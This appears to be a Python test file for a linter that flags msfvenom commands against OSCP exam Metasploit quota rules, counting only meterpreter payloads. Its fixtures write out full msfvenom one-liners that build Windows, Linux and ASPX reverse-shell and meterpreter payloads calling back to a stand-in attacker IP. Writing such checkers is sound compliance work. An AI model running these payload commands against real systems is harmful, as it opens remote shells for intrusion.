"""Port of scratch test_iter310: msfvenom is UNLIMITED on every exam target;
only a METERPRETER payload binds the one-target Metasploit quota. Before
iter-310 any second msfvenom was flagged as "quota blown", scaring operators
off a legal technique. This module keeps that correction permanent."""
import unittest

from tests._helpers import run_keyword, hint_names_banned_tool

TC1 = ("\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o a.exe\n"
       "$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=444 -f elf -o b.elf\n"
       "$ msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=445 -f raw\n")
TC2 = ("\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o m1.exe\n"
       "$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf -o m2.elf\n")
TC3 = ("\n$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f exe -o s1.exe\n"
       "$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o m.exe\n"
       "$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=8080 -f aspx -o s2.aspx\n")
TC4 = "\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o m.exe\n" * 2
TC5 = "$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=1 -f exe -o x.exe\n"
TC6 = (("# padding line\n" * 5000)
       + "$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o late.exe\n")


def msf(text, ext=".txt"):
    r, s = run_keyword(text, ext)
    return ([f for f in r.findings if "msfvenom" in f["detail"]],
            [e for e in s.items if e.kind == "msfvenom_payload"])


class MsfvenomQuotaTests(unittest.TestCase):
    # 1
    def test_non_meterpreter_all_info_quota_free(self):
        h, ev = msf(TC1)
        self.assertEqual(len(h), 3)
        self.assertTrue(all(f["severity"] == "INFO" for f in h), [f["severity"] for f in h])
        self.assertTrue(all(f["category"] == "RECON" for f in h))
        self.assertTrue(all("quota-free" in f["detail"] for f in h))
        self.assertTrue(all("multi/handler" in f["hint"] for f in h))
        self.assertEqual(len(ev), 3)
        self.assertTrue(all(e.meta["meterpreter"] == "False" and e.meta["quota_count"] == "0"
                            for e in ev))

    # 2
    def test_meterpreter_first_medium_second_high(self):
        h, ev = msf(TC2)
        self.assertEqual([f["severity"] for f in h], ["MEDIUM", "HIGH"])
        self.assertTrue(h[0]["detail"].startswith(
            "msfvenom METERPRETER payload #1: windows/x64/meterpreter/reverse_tcp "
            "LHOST=10.10.14.5:4444 -f exe -o m1.exe"), h[0]["detail"])
        self.assertIn("OSCP+ QUOTA", h[0]["hint"])
        self.assertIn("SAME machine", h[1]["hint"])
        self.assertEqual(ev[0].meta["meterpreter"], "True")
        self.assertEqual(ev[0].meta["quota_count"], "1")
        self.assertEqual(ev[1].meta["quota_count"], "2")

    # 3
    def test_mixed_only_meterpreter_counts(self):
        h, ev = msf(TC3)
        self.assertEqual([f["severity"] for f in h], ["INFO", "MEDIUM", "INFO"])
        free = [e for e in ev if e.meta["meterpreter"] == "False"]
        self.assertEqual(len(free), 2)
        self.assertTrue(all(e.meta["quota_count"] == "0" for e in free))
        self.assertEqual(ev[-1].meta["count_in_file"], "3")

    # 4
    def test_identical_meterpreter_dedupes(self):
        h, _ = msf(TC4)
        self.assertEqual(len(h), 1)
        self.assertEqual(h[0]["severity"], "MEDIUM")

    # 5
    def test_doc_file_gate(self):
        h, _ = msf(TC5, ".md")
        self.assertEqual(h, [])

    # 6
    def test_fires_past_64kb_full_text_scan(self):
        self.assertGreater(len(TC6), 65536)
        h, _ = msf(TC6)
        self.assertEqual(len(h), 1)
        self.assertEqual(h[0]["line"], 5001)

    # 7
    def test_hints_never_recommend_a_second_meterpreter_or_banned_tool(self):
        # NOT linted with lint_command on purpose: the INFO hint legitimately
        # shows `msfconsole -q -x 'use multi/handler'` (the handler is exempt
        # on the exam) while msfconsole is denylisted for chain-lint purposes.
        for text in (TC1, TC2, TC3):
            h, _ = msf(text)
            for f in h:
                with self.subTest(detail=f["detail"][:60]):
                    hint = f["hint"] or ""
                    self.assertFalse(hint_names_banned_tool(hint), hint)
                    if f["severity"] == "INFO":
                        # quota-free payload: the hint shows the catcher, never a stager
                        self.assertIn("multi/handler", hint)
                        self.assertNotIn("meterpreter/", hint)
                    else:
                        # meterpreter payload: the alternative is always non-meterpreter
                        self.assertIn("shell_reverse_tcp", hint)


if __name__ == "__main__":
    unittest.main()
